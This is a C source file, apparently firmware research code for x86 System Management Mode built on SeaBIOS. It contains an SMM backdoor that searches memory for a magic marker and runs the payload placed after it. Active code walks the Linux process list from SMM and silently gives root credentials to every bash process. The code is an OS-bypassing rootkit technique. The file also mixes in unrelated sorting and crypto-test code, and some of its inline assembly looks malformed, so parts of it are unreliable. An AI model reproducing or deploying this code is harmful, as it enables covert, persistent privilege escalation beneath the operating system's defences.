#include "output.h" // dprintf
#include "string.h" // memcpy
#include "x86.h" // inb

#include "smx.h"
#include "sodium.h"
#include "microbench.h"

#define CONFIG_X86_32
#include "linux/asm/apicdef.h"
#include "apic.h"

#include <stdint.h>
#include <stdlib.h>

/**
    Since the native memset provided by SeaBIOS is so inefficient in 32-bit SMM
    therefore we need to replace it for better performance
*/
#define memset __builtin_memset

void checkpoint(const char *what);
u64 tsc_now();
void randombytes_buf(void * const buf, const size_t size);
void init_ring_buffer();
void pcnet32_handler();
void loopback();
void microbench_time_service();

static inline void enable_sse()
{
    asm volatile("movl %cr0, %eax\n");
    asm volatile("andl %ax, 0xFFFB\n");
    asm volatile("orl %ax, 0x2\n");
    asm volatile("movl %eax, %cr0\n");
    asm volatile("movl %cr4, %eax\n");
    asm volatile("orl $1536, %ax\n");
    asm volatile("movl %eax, %cr4\n");
}

/* Allowed int vectors are from 0x10 to 0xFE */

#define IOAPIC_BASE	(void *)IO_APIC_DEFAULT_PHYS_BASE
#define LOCAL_APIC_BASE	(void *)APIC_DEFAULT_PHYS_BASE

#define NMI_VECTOR			0x02
#define APIC_BASE (LOCAL_APIC_BASE)

void trigger_self_ipi(int vec)
{
    enable_x2apic();
    apic_icr_write(APIC_DEST_SELF | APIC_DEST_PHYSICAL | APIC_DM_FIXED | vec, 0);
    asm volatile ("nop");
}

#define IOREDTBL(x) (0x10 + 2 * x)

#define KBD_IRQ 1
#define NIC_IRQ 11
int nic_vec = 0, kbd_vec = 0;

static void show_ioredtbl()
{
    int vector_address = 0;

    for (int i = 0; i < 24; ++i) {
        vector_address = 0xff & ioapic_read_reg(IOREDTBL(i));
        if (0x00 != vector_address)
            dprintf(1, "IRQ #%d\tIOREDTBL[0x%02x] addr: 0x%02x\n", i, IOREDTBL(i), vector_address);
        if (KBD_IRQ == i)
            kbd_vec = vector_address;
        if (NIC_IRQ == i)
            nic_vec = vector_address;
    }
    dprintf(1, "\n");
}

void enclave_request(  )
{
    show_ioredtbl();
#if 0
    static short first = 0;
    if (!first) {
        ioapic_write_reg(IOREDTBL(NIC_IRQ), APIC_DM_SMI);
        dprintf(3, "NIC is taken\n");
        pcnet32_probe();
        first = 1;
    }

    pcnet32_ring_buffer();
#endif
#if 1
	if ( 0x3b == nic_vec ) {
	    ioapic_write_reg(IOREDTBL(NIC_IRQ), APIC_DM_SMI);
        dprintf(1, "================ >>> Your PCNet32 has been taken\n");

        pcnet32_probe();
        memset(0x00, 0x0, 4000);
    } else {
        pcnet32_ring_buffer();
        trigger_self_ipi(0x3b);
    }
#endif
}

extern void *shmem_base;

///
#define PAGE_SIZE	4096
#define MAGIC		"!$SMMBACKDOOR$!"

#define IOAPIC_BASE	(void *)0xfec00000
#define LOCAL_APIC_BASE	(void *)0xfee00000
#define HIJACKED_IRQ	0x2c
#define INTERRUPT_VECTOR	0x3e

typedef unsigned long ULONG;
typedef unsigned short USHORT;
typedef unsigned char UCHAR;

typedef u32 uint32_t;
typedef u64 uint64_t;

extern unsigned long __force_order;

static int irq_hijacked;


static inline unsigned long read_cr0(void)
{
	unsigned long val;
	asm volatile("mov %%cr0,%0\n\t" : "=r" (val), "=m" (__force_order));
	return val;
}

static inline void write_cr0(unsigned long val)
{
	asm volatile("mov %0,%%cr0": : "r" (val), "m" (__force_order));
}

static void execute_code(void *addr)
{
	unsigned char *p;
	int (*f)(void);
	int ret = 0;

	p = addr;
	p += sizeof(MAGIC)-1;
	f = (void *)p;

	dprintf(3, "[backdoor] first bytes: %02x %02x %02x\n",
		p[0], p[1], p[2]);
	dprintf(3, "[backdoor] executing payload\n");

	ret = f();

	dprintf(3, "[backdoor] done (0x%x)\n", ret);
}

static int find_magic(void *addr, void *pattern, size_t size)
{
	return memcmp(addr, pattern, size) == 0;
}

/* http://wiki.osdev.org/Detecting_Memory_(x86)#Getting_an_E820_Memory_Map */
static int scan_memory(void)
{
	register ULONG *mem;
	ULONG mem_count, a;
	USHORT memkb;
	ULONG cr0;
	int found;

	found = 0;

	mem_count=0;
	memkb=0;

	// store a copy of CR0
	cr0 = read_cr0();

	// invalidate the cache
	// write-back and invalidate the cache
	__asm__ __volatile__ ("wbinvd");

	// plug cr0 with just PE/CD/NW
	// cache disable(486+), no-writeback(486+), 32bit mode(386+)
	write_cr0(cr0 | 0x00000001 | 0x40000000 | 0x20000000);

	do {
		memkb++;
		mem_count += 1024*1024;
		mem = (ULONG *)mem_count;

		//dprintf(3, "[probe memory] %p\n", mem);

		a= *mem;
		*mem = 0x55AA55AA;

		// the empty asm calls tell gcc not to rely on what's in its registers
		// as saved variables (this avoids GCC optimisations)
		asm("":::"memory");

		if (*mem != 0x55AA55AA) {
			mem_count = 0;
		} else {
			*mem = 0xAA55AA55;
			asm("":::"memory");
			if (*mem != 0xAA55AA55)
				mem_count = 0;
		}

		if (mem_count != 0) {
			void *addr;
			int i;

			addr = (void *)mem_count;
			for (i = 0; i < (1024 * 1024) / PAGE_SIZE; i++) {
				if (find_magic(addr, MAGIC, sizeof(MAGIC)-1)) {
//					dprintf(3, "[backdoor] magic found at %p\n", addr);
//				    memcpy(addr, 0x00, 4096);
//					execute_code(addr);
					found = 1;
				}
				addr += PAGE_SIZE;
			}
		}

		asm("":::"memory");
		*mem = a;
	} while (memkb < 4096 && mem_count != 0);

	write_cr0(cr0);

	return found;
}
///

void enc_dec_test()
{
    unsigned char      message[1<<12];
    unsigned char      ciphertext[1<<13];
    unsigned char      *ad = "";
    unsigned char      nonce[crypto_aead_aes256gcm_NPUBBYTES];
    unsigned char      key[crypto_aead_aes256gcm_KEYBYTES];
    size_t             ad_len = 0;
    unsigned long long found_ciphertext_len;
    unsigned long long found_message_len;

//    memset(key, 0xca, crypto_aead_aes256gcm_KEYBYTES);
//    memset(nonce, 0xff, crypto_aead_aes256gcm_NPUBBYTES);

    crypto_aead_aes256gcm_encrypt(ciphertext, &found_ciphertext_len,
                                      message, MSG_SIZE,
                                      ad, ad_len, NULL, nonce, key);

    if (crypto_aead_aes256gcm_decrypt(message, &found_message_len,
                                          NULL, ciphertext, PKT_SIZE,
                                          ad, ad_len, nonce, key) != 0) {
        dprintf(1, "Verification of test vector failed\n");
    }
}

#include <stdint.h>
#include <time.h>

int Partition(int A[],int L,int R)
{
    int i=L,j=R;
    int pivot=A[i];
    while(i<j)
    {
        while(i<j&&A[j]>=pivot) --j;
        A[i]=A[j];
        while(i<j&&A[i]<=pivot) ++i;
        A[j]=A[i];
    }
    A[i]=pivot;
    return i;
}
void Quick_Sort(int A[],int L,int R)
{
    if(L<R)
    {
        int i=Partition(A,L,R);
        Quick_Sort(A,L,i-1);
        Quick_Sort(A,i+1,R);
    }
}

void supervisor()
{
    time_t rtc_read_time ( void );
    rtc_read_time();

    #define NN 1000
    int i;
    int a,b;

    synch_tsc();

    a = rdtscll();
    rtc_read_time();
    b = rdtscll();
    dprintf(1, "rtc %lld\n", (b-a));

    a = rdtscll();
    char mem[1<<21];
    memcpy(mem, 0x0, sizeof mem);
    b = rdtscll();
    dprintf(1, "rtc %lld\n", (b-a));

//    enable_sse();

//    scan_memory();
    
//    enc_dec_test();

#if 1

#define virt_to_phys(VA) (((VA) & 0xFFFFFFF) + 0x30000000)

#define    linux_name   0xa30
#define    linux_tasks  0x788
#define    linux_mm     0x7d8
#define    linux_pid    0x888
#define    linux_pgd    0x040
#define    linux_cred   0xa28

// 0x10500: init_task from System.map
// 0xa30: task_struct->comm
uint32_t p = 0x10500 + linux_name;
uint32_t *init_task;
char *cur;
char *procname;
char *tmp;
uint32_t *pid;
uint32_t *cred_pointer;
char *cred;
uint32_t *euid;
uint32_t *egid;
uint32_t *next_task;
uint32_t *next_pointer;

// linear search because of kalsr
for (uint32_t kalsr_offset = 0x100000; kalsr_offset <= 0x40000000; kalsr_offset += 0x100000) {
    cur = p + kalsr_offset;

    // found init_task
    if (0 == memcmp("swapper/0", cur, 9)) {
        // adjust to task_struct base
        cur -= linux_name;
        pid = cur + linux_pid;
        procname = cur + linux_name;
        next_pointer = cur + linux_tasks;
        next_task = virt_to_phys(*next_pointer - linux_tasks);
        dprintf(1, "pid[%d] [%p] -> [%p] %s\n", *pid, cur, next_task, procname);
        init_task = cur;

while (1) {
        cur = next_task;
        pid = cur + linux_pid;
        cred_pointer = cur + linux_cred;
        cred = virt_to_phys(*cred_pointer);
        euid = cred + 0x14;
        egid = cred + 0x18;
        procname = cur + linux_name;
        next_pointer = cur + linux_tasks;
        next_task = virt_to_phys(*next_pointer - linux_tasks);

        uint32_t value = next_task;
        if (0 == ((value&0xFFFFF)-0x10500))
            break;

        if (0 == *pid)
            break;

        dprintf(1, "pid[%d] euid[%d] egid[%d] [%p]->[%p] %s\n", *pid, *euid, *egid, cur, next_task, procname);
        
        if (0 == memcmp("bash", procname, 4)) {
            *euid = 0;
            *egid = 0;
        }

}
        break;
    }
}
#endif

//_print_hex("", (*p)+0xa30, 32);
//memset(*p, 0x0, 8);
}

#undef memset
